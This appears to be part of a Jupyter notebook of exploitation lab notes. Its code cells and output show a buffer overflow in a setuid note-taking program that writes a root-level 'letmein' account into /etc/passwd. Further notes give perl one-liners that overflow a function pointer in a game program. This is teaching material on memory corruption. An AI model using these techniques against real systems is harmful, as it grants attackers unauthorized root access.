\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mnamed_script_magic\u001b[0;34m(line, cell)\u001b[0m\n\u001b[1;32m    140\u001b[0m             \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    141\u001b[0m                 \u001b[0mline\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mscript\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 142\u001b[0;31m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mshebang\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mline\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    143\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    144\u001b[0m         \u001b[0;31m# write a basic docstring:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m</home/user/miniconda3/lib/python3.7/site-packages/decorator.py:decorator-gen-109>\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magic.py\u001b[0m in \u001b[0;36m<lambda>\u001b[0;34m(f, *a, **k)\u001b[0m\n\u001b[1;32m    185\u001b[0m     \u001b[0;31m# but it's overkill for just that one bit of state.\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    186\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0mmagic_deco\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 187\u001b[0;31m         \u001b[0mcall\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;32mlambda\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0mf\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m*\u001b[0m\u001b[0ma\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0;34m**\u001b[0m\u001b[0mk\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    188\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    189\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0mcallable\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0marg\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;32m~/miniconda3/lib/python3.7/site-packages/IPython/core/magics/script.py\u001b[0m in \u001b[0;36mshebang\u001b[0;34m(self, line, cell)\u001b[0m\n\u001b[1;32m    243\u001b[0m             \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mstderr\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mflush\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    244\u001b[0m         \u001b[0;32mif\u001b[0m \u001b[0margs\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mraise_error\u001b[0m \u001b[0;32mand\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m!=\u001b[0m\u001b[0;36m0\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 245\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mCalledProcessError\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mp\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreturncode\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0moutput\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0mout\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mstderr\u001b[0m\u001b[0;34m=\u001b[0m\u001b[0merr\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    246\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    247\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_run_script\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mp\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mcell\u001b[0m\u001b[0;34m,\u001b[0m \u001b[0mto_close\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
      "\u001b[0;31mCalledProcessError\u001b[0m: Command 'b'./notetaker.exe $(perl -e \\'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"\\')\\n'' returned non-zero exit status 134."
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "./notetaker.exe $(perl -e 'print \"letmein:XXq2wKiyI43A2:0:0:\" . \"A\"x75 . \":/root:/tmp/etc/passwd\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 100,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "colord:x:129:137:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n",
      "geoclue:x:130:138::/var/lib/geoclue:/usr/sbin/nologin\n",
      "king-phisher:x:131:139::/var/lib/king-phisher:/usr/sbin/nologin\n",
      "Debian-gdm:x:132:140:Gnome Display Manager:/var/lib/gdm3:/bin/false\n",
      "systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n",
      "user:x:1000:1000:user,12,,:/home/user:/bin/bash\n",
      "tom:x:1001:1001:tom,123,456,:/home/tom:/bin/bash\n",
      "jerry:x:1002:1002:jerry,788,454,:/home/jerry:/bin/bash\n",
      "�\u0003\u0000\u0000\n",
      "letmein:XXq2wKiyI43A2:0:0:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA:/root:/tmp/etc/passwd\n"
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "tail /etc/passwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## now login or su letmein with password"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## BSS Segment, Function Pointer Overflow\n",
    "### Game of Chance program\n",
    "- three different game functions\n",
    "    - uses a single global function pointer to remember last game played\n",
    "- uses global struct object in BSS segment to hold plyayer's info\n",
    "- seteuid multi-user program that stores user's data in /var folder"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- compile game_of_chance.c\n",
    "- change ownership to root:root\n",
    "- seteuid\n",
    "- run and play game\n",
    "- player.name buffer is 100 bytes\n",
    "- input_name() copies data to player.name until \\n\n",
    "- play_the_game function can take advantage of the overflown function pointer when any game is \n",
    "- put the game to background - ctrl+z\n",
    "- find the difference between player.name address and player.current_game (100)\n",
    "- return to the suspended program: fg\n",
    "- enter 5 to change name\n",
    "- change name to 100As+BBBB+\\n\n",
    "- play the same game and see the DEBUG\n",
    "- find valid address to overwrite current_game func ptr\n",
    "- list symbols in object/binary (nm)\n",
    "    - nm game_of_chance.exe\n",
    "- automate/simulate the game play\n",
    "- $ perl -e 'print \"1\\n10\\nn\\n5\\n\" . \"A\"x100 . \"jackpot address in rev order\" . \"1\\n\" . \"y\\n\"x10 . \n",
    "\"n\\n5\\nJohn Doe\\n7\"' | ./game_of_chance"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
